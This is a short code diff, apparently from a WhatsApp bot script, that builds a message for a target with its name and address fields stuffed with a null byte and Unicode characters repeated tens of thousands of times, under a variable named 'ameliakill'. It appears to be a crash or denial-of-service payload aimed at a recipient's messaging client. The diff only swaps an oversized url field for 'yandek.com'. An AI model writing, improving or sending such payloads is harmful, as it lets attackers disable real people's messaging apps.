@@ -753,7 +753,7 @@ const ameliakill = "mexx whyy ¿?" + "𑇂𑆵𑆴𑆿".repeat(60000);
          name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
 
 address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
-         url: ${"𑇂𑆵𑆴𑆿".repeat(25000)}.com,
+         url: "yandek.com",
       }
       let msg = generateWAMessageFromContent(isTarget, {
          viewOnceMessage: {
